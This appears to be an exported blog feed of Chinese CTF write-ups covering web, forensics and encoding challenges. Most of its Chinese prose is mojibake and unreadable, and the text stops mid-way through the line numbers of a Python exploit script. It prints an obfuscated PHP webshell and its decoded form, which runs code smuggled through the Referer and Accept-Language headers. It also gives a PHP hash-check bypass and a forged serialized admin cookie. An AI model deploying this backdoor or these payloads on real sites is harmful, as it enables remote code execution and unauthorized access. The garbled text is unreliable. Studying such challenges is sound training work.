php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>]) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;&lt;h3 class=&quot;error&quot;&gt;Nice try, but it won\&#x27;t be that easy ;)&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>]) === hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>])) &#123;</span><br><span class="line">      output_flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;&lt;h3 class=&quot;error&quot;&gt;Your inputs don\&#x27;t match&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦è¾“å…¥input1å’Œinput2ï¼Œå¹¶ä¸”1ä¸2ä¸èƒ½ç›¸åŒï¼Œä½†æ˜¯ä»–ä»¬çš„sha256è¦ç›¸åŒå¯ä»¥è¿™æ ·ç»•è¿‡<br><code>input1[]=1&amp;input2[]=2</code></p><p><img src="/images/2022-RITSEC-CTF/2.png" alt="image-20220402164521180"></p><h3 id="Pretty-Horrible-Program-2"><a href="#Pretty-Horrible-Program-2" class="headerlink" title="Pretty Horrible Program 2"></a>Pretty Horrible Program 2</h3><p>è€ƒç‚¹ï¼šç®€å•phpååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//public $role = &#x27;User&#x27;;</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$role</span>=<span class="string">&quot;Admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function is_admin()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   if ($this-&gt;role == &#x27;Admin&#x27;) &#123;</span></span><br><span class="line">    <span class="comment">//     return true;</span></span><br><span class="line">    <span class="comment">//   &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//     return false;</span></span><br><span class="line">    <span class="comment">//   &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __sleep()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   return array($this-&gt;role);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$c</span> = serialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;<span class="comment">//O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;Admin&quot;;&#125;</span></span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œcookie çš„roleå¿…é¡»è¦æ˜¯admin,æ‰€ä»¥æˆ‘ä»¬æŠŠUseræ¢æˆadminï¼Œå…¶ä»–æ³¨é‡Šæ‰ï¼Œè¾“å‡ºå°±å¯ä»¥äº†<br>ç”±äºæˆ‘ä»¬è¿™é‡Œæ˜¯post å’Œ cookieæäº¤ ï¼Œè¦æ³¨æ„ç¼–ç é—®é¢˜ï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥urlencodeï¼Œæäº¤å°±å¯ä»¥äº†</p><p><img src="/images/2022-RITSEC-CTF/3.png" alt="image-20220402181841597"></p><h4 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> hashç¢°æ’ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022hwsgogogo</title>
      <link href="/2022/01/26/CTFS/2022hwsgogogo/"/>
      <url>/2022/01/26/CTFS/2022hwsgogogo/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h5><p>è€ƒç‚¹ï¼šæ‹¼å›¾+å–è¯+Aztec ç <br>ä¸‹è½½ä¸‹æ¥å‹ç¼©åŒ…æœ‰ä¸¤ä¸ªé™„ä»¶ï¼Œåˆ†åˆ«è§£å‹ä¸€ä¸‹ï¼Œä¸€ä¸ªæ˜¯æœ‰è®¸å¤šå›¾ç‰‡ï¼Œä¸€ä¸ªæ˜¯ä¸€ä¸ªrawæ–‡ä»¶ï¼Œæ˜¾ç„¶æ˜¯å–è¯äº†ã€‚<br>å…ˆçœ‹è¿™ä¸ªæœ‰è®¸å¤šå°å›¾ç‰‡çš„å‹ç¼©åŒ…ï¼Œæ˜¾ç„¶æ‹¼å›¾äº†ï¼Œæ€»å…±256å¼ å›¾ç‰‡ï¼Œæ˜¯16<em>16çš„å›¾ç‰‡ï¼Œæ˜¯160</em>100çš„å°å›¾ç‰‡<br><strong><img src="/images/hws2022/1.png" alt="image-20220126202221239"></strong><br>ç›´æ¥<code>montage *png -tile 16x16 -geometry 160x100+0+0 out.png</code>åˆæˆä¸€ä¸ªå¤§å›¾ç‰‡<br>è¿™è¾¹ç”¨gapsæ‹¼äº†å‡ æ¬¡æ²¡å‡ºï¼Œæœæ–­æŠŠout.pngæ”¹ä¸€ä¸‹å¤§å°ï¼Œå¤§å›¾å®¤ 2560<em>1600çš„ï¼Œæˆ‘ä»¬æ”¹æˆæ­£æ­£æ–¹å½¢ï¼Œ1600</em>1600<br><img src="/images/hws2022/2.png" alt="image-20220126202810888"><br><code>gaps --image=out2.png --generations=15 --population=256 --size=100 --verbose</code><br>åœ¨æ‹¼ä¸€ä¸‹å°±å‡ºæ¥äº†ï¼Œæ³¨æ„å‚æ•°<br><img src="/images/hws2022/3.png" alt="image-20220126203016856"><br>flagå…³é”®å­—æ²¡æœ‰ï¼Œæœä¸€ä¸ªzipï¼Œæ¡Œé¢ä¸Šæœ‰csgo.zip<br><code> python vol.py -f 2.raw --profile=WinXPSP2x86 filescan | grep flag</code><br><code> python vol.py -f 2.raw --profile=WinXPSP2x86 filescan | grep zip</code><br><img src="/images/hws2022/4.png" alt="image-20220126203415648"><br><code>python vol.py -f 2.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002182dc0 -D ./dasctf -u</code><br>æä¸€ä¸‹ï¼Œæœ‰å¯†ç ,ç”¨åˆšåˆšçš„å¯†ç è§£å‹ï¼Œé‡Œé¢æ˜¯ä¸¤ä¸ªå›¾ç‰‡ï¼Œç¬¬ä¸€ä¸ªå›¾ç‰‡å®¤csgoå›¾ç‰‡ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸€ä¸ªç ä¸­é—´ç¼ºäº†å®šä½ç¬¦ï¼Œç”¨è°·æ­Œæœä¸€ä¸‹ï¼Œæ˜¯Aztecï¼Œåœ¨çº¿ç½‘ç«™<code>https://products.aspose.app/barcode/zh-hans/generate</code>ï¼Œå…ˆç”Ÿæˆä¸€ä¸ªaztecï¼ŒæŠŠä¸­é—´çš„å®šä½ç¬¦æ‰£ä¸‹æ¥ï¼Œç„¶åè´´ä¸Šå»ï¼Œæ‰«ç å°±å¯ä»¥äº†ã€‚<br><img src="/images/hws2022/5.png" alt="image-2022012620341548"><br><img src="/images/hws2022/6.png" alt="image-20220126204727776"></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> hws2022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D.I.E&amp;Trinity CTFéƒ¨åˆ†wp</title>
      <link href="/2022/01/24/D-I-E-Trinity-CTF%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/01/24/D-I-E-Trinity-CTF%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/tjuctf/index.png" alt="image-20220124192143500"><br>emmm å¤©æ´¥å¤§å­¦å’Œå—äº¬å¤§å­¦çš„æ‹›æ–°èµ›ï¼Œé¢˜ç›®è¿˜æ˜¯å¾ˆæœ‰è´¨é‡çš„ï¼Œtcläº†ï¼Œæœ‰äº›é¢˜è¿˜æ˜¯ä¸ä¼š<br>è®°ä¸€ä¸‹å§</p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h5><p>ä¸‹è½½ä¸€ä¸ªé™„ä»¶ï¼Œfileçœ‹ä¸€ä¸‹ï¼Œå‘ç°æ˜¯dataï¼Œä¸ç®¡äº† ï¼Œç›´æ¥foremoståˆ†ç¦»ä¸€ä¸‹<br><code>foremost data</code><br>æœ‰ä¸¤ä¸ªå›¾ç‰‡ä¸€ä¸ªjpgï¼Œä¸€ä¸ªpngä¸¤ä¸ªå›¾ç‰‡æ˜¯ä¸€æ ·çš„ï¼Œç›²çŒœ<code>ç›²æ°´å°</code><br>é¡¹ç›®ä¸‹è½½<code>https://github.com/chishaxie/BlindWaterMark</code><br>ç›´æ¥<code>python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png</code><br><img src="/images/tjuctf/1.png" alt="image-20220124194256825">å‘ç°ï¼Œå›¾ç‰‡ä¸å¤ªæ¸…æ¥šï¼Œé—®äº†ä¸‹å‡ºé¢˜äººï¼Œæœ‰alphaå€¼ï¼Œç ”ç©¶ä¸€ä¸‹è„šæœ¬<br><img src="/images/tjuctf/2.png" alt="image-20220124194320886"><br>çœ‹åˆ° <code>--alpha &lt;float&gt;,  Manual setting alpha (default is 3.0)</code><br>é»˜è®¤å€¼ä¸ºä¸‰ï¼Œæˆ‘ä»¬è°ƒåˆ°5<code> python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png --alpha 5</code><br>è¿˜æ˜¯ä¸æ¸…æ¥šï¼ŒåŠ åˆ°10  <code>python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png --alpha 10</code><br><img src="/images/tjuctf/3.png" alt="image-20220124194614378"></p><h5 id="ezdecode"><a href="#ezdecode" class="headerlink" title="ezdecode"></a>ezdecode</h5><p>ç­¾åˆ°é¢˜ï¼Œæ˜¯å„ç§ç¼–ç çš„ç»„åˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ç¼–ç 1ï¼šYou Know That</span><br><span class="line">ZmxhZ3t3M2xjMG1f   --&gt;base64</span><br><span class="line">flag&#123;w3lc0m_7o_amaz1n9_CTF_vv0RId_!&#125;</span><br><span class="line">ç¼–ç 2ï¼šKey == 2</span><br><span class="line">7_mznoaa19    --&gt;æ …æ    keyä¸ºä¸º2</span><br><span class="line">ç¼–ç 3ï¼šPlay With Bubble</span><br><span class="line">xilog-fahig-kalal-kytef-begig-nanyh-zumal-tuxox   --&gt;æ°”æ³¡</span><br><span class="line">`http://www.hiencode.com/bubble.html`</span><br><span class="line">_CTF_vv0RId_!&#125;</span><br></pre></td></tr></table></figure><h5 id="è¿™é‡Œæœ‰åé—¨ï¼"><a href="#è¿™é‡Œæœ‰åé—¨ï¼" class="headerlink" title="è¿™é‡Œæœ‰åé—¨ï¼"></a>è¿™é‡Œæœ‰åé—¨ï¼</h5><p>ä¸ªäººè®¤ä¸ºè¿™ä¸ªé¢˜è¿˜æ˜¯éå¸¸æœ‰è¶£çš„ï¼Œé‡Œé¢æ¶‰åŠçš„åŠ å¯†æ–¹æ³•è¿˜æ²¡ææ‡‚ï¼Œå†™ä¸€ä¸‹åšé¢˜è®°å½•å§<br>æ‹¿åˆ°é™„ä»¶ï¼Œé¢˜ç›®å·²ç»è¯´äº†ï¼Œæ˜¯åé—¨ï¼Œçœ‹äº†ä¸€ä¸‹,æ˜¾ç„¶æ˜¯ç»è¿‡æ··æ·†åŠ å¯†çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="string">&#x27;S+)$p.iS=$iSq[$m[2][$z]iS]iSiS;if(strpos(iS$p,$h)===0iS)&#123;$s[$iiS]=iS&quot;&quot;;$iSpiS=$ss($p,3);&#125;if(arriSiSay&#x27;</span>;</span><br><span class="line"><span class="variable">$H</span>=<span class="string">&#x27;s=&amp;iS$_SESSiSION;$ss=&quot;subsiSiStr&quot;;$sliS=&quot;stiSrtolower&quot;;$i=$miS[1][iS0].iS$m[iS1][iS1];$h=$sl($ss(md5iS&#x27;</span>;</span><br><span class="line"><span class="variable">$X</span>=<span class="string">&#x27;($i.iS$kh),0,iS3)iS);$f=$sl(iS$ssiS(iSmd5($i.$kf),iS0iS,iS3));$p=&quot;&quot;;foriS($z=1;$z&lt;couiSiSnt($m[1]);$z+i&#x27;</span>;</span><br><span class="line"><span class="variable">$L</span>=str_replace(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crexxatex_fxxunxction&#x27;</span>);</span><br><span class="line"><span class="variable">$E</span>=<span class="string">&#x27;;$i&lt;$l;)&#123;foriS($j=0;(iS$j&lt;$ciS&amp;&amp;iS$i&lt;$l);$jiSiS++,iS$i++)&#123;$o.=$t&#123;$iiS&#125;^$k&#123;$j&#125;iS;iS&#125;iS&#125;riSeturn $o;&#125;$iSr=iSiS$&#x27;</span>;</span><br><span class="line"><span class="variable">$Q</span>=<span class="string">&#x27;=basiSiSe64_encode(x(giSzcompress($o)iS,$k)iS);print(&quot;iS&lt;$k&gt;iS$d&lt;/iS$k&gt;&quot;);@siSessioniS_destroyiS();&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>=<span class="string">&#x27;_SiSERViSEiSR;iS$rr=@$r[&quot;HTTiSP_REFEiSRER&quot;iS];$ra=@$r[iS&quot;iSHTTP_ACCEiSPT_LANGiSUAGE&quot;]iS;ifiS($rr&amp;&amp;$iSra)&#123;$&#x27;</span>;</span><br><span class="line"><span class="variable">$l</span>=<span class="string">&#x27;iS$kiSh=&quot;3481&quot;iS;iS$kf=&quot;iS9diS7b&quot;;funiSctiSion x($t,$k)&#123;$c=strliSen($kiS);iSiS$l=strlen($tiS);$o=&quot;&quot;;foiSr(iS$i=0iS&#x27;</span>;</span><br><span class="line"><span class="variable">$h</span>=<span class="string">&#x27;ll(iS&quot;/([\\w])iS[\\w-]+(iS?:;q=0.iS([iSiS\\d]))?,?/&quot;,iS$riSa,iS$miS);if($q&amp;&amp;$m)&#123;@siSession_staiSrtiS(iS);$&#x27;</span>;</span><br><span class="line"><span class="variable">$Z</span>=<span class="string">&#x27;art();@evaiSl(@giSzuniSiSciSompress(@x(@baseiS64_decodeiS(pregiS_riSeplace(ariSray(&quot;/_/&quot;,&quot;/-/iS&quot;),arriSa&#x27;</span>;</span><br><span class="line"><span class="variable">$W</span>=<span class="string">&#x27;_key_exiSists(iS$i,$s))&#123;iS$siS[$i].=$piS;$e=iSiSstrpos($siS[$iiS]iS,$f);if($e)&#123;$k=$kh.$kiSf;ob_stiSiS&#x27;</span>;</span><br><span class="line"><span class="variable">$g</span>=<span class="string">&#x27;u=paiSrse_iSiSurl($rr);pariSse_siStr($u[&quot;queriSy&quot;],$iSq)iS;iSiS$q=array_iSvaluiSes($q);pregiS_match_a&#x27;</span>;</span><br><span class="line"><span class="variable">$D</span>=<span class="string">&#x27;y(iS&quot;/&quot;,iS&quot;iS+&quot;)iS,$ss($s[$i],iS0,$e)iS)),$k)))iS;$o=obiS_get_iSiScontents()iS;ob_eniSd_iScleaiSn();$d&#x27;</span>;</span><br><span class="line"><span class="variable">$O</span>=str_replace(<span class="string">&#x27;iS&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$l</span>.<span class="variable">$E</span>.<span class="variable">$p</span>.<span class="variable">$g</span>.<span class="variable">$h</span>.<span class="variable">$H</span>.<span class="variable">$X</span>.<span class="variable">$u</span>.<span class="variable">$W</span>.<span class="variable">$Z</span>.<span class="variable">$D</span>.<span class="variable">$Q</span>);</span><br><span class="line"><span class="variable">$q</span>=<span class="variable">$L</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$O</span>);<span class="variable">$q</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>googleä¸€ä¸‹å…³é”®ä»£ç ï¼Œç›´æ¥å‡ºäº†ä¸€ä¸ªè§£å¯†ç½‘ç«™<code>https://www.unphp.net/</code>æŠŠä»£ç æ‹¿åˆ°è¿™ä¸ªç½‘ç«™è§£ä¸€ä¸‹<br><img src="/images/tjuctf/4.png" alt="image-20220124195541546"><br>åé¢ï¼Œæœåˆ°è¿™ä¸ªé©¬å­çŸ¥é“å±…ç„¶è¿˜å¯ä»¥ç›´æ¥è¾“å‡º<br><img src="/images/tjuctf/5.png" alt="image-20220124195909580"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$kh</span> = <span class="string">&quot;3481&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;9d7b&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;(<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>);<span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span>.= <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$rr</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rr</span> &amp;&amp; <span class="variable">$ra</span>) &#123;</span><br><span class="line">    <span class="variable">$u</span> = parse_url(<span class="variable">$rr</span>);</span><br><span class="line">    parse_str(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>], <span class="variable">$q</span>);</span><br><span class="line">    <span class="variable">$q</span> = array_values(<span class="variable">$q</span>);</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="variable">$ra</span>, <span class="variable">$m</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$q</span> &amp;&amp; <span class="variable">$m</span>) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        <span class="variable">$s</span> = &amp; <span class="variable">$_SESSION</span>;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        <span class="variable">$sl</span> = <span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>] . <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$h</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span> . <span class="variable">$kh</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span> . <span class="variable">$kf</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">1</span>;<span class="variable">$z</span> &lt; count(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++) <span class="variable">$p</span>.= <span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$p</span>, <span class="variable">$h</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$p</span> = <span class="variable">$ss</span>(<span class="variable">$p</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="variable">$i</span>, <span class="variable">$s</span>)) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>].= <span class="variable">$p</span>;</span><br><span class="line">            <span class="variable">$e</span> = strpos(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="variable">$f</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="variable">$k</span> = <span class="variable">$kh</span> . <span class="variable">$kf</span>;</span><br><span class="line">                ob_start();</span><br><span class="line">                <span class="keyword">eval</span>(@gzuncompress(@x(base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>, <span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;+&quot;</span>), <span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$e</span>))), <span class="variable">$k</span>)));</span><br><span class="line">                <span class="variable">$o</span> = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                <span class="variable">$d</span> = base64_encode(x(gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é©¬å­è¿˜è‡­è¿˜é•¿ï¼Œç›´æ¥æœé©¬å­é‡Œå…³é”®ä»£ç ï¼Œ<code>https://www.jianshu.com/p/c8099299ac2a</code><br>å½“æ—¶çœ‹çš„ä¸æ˜¯è¿™ä¸ªå¸ˆå‚…çš„æ–‡ç« ï¼Œå½“æ—¶çš„æ‰¾ä¸åˆ°äº†ï¼Œéƒ½ä¸€æ ·ï¼Œpythonä¸€å»ºåˆ©ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span 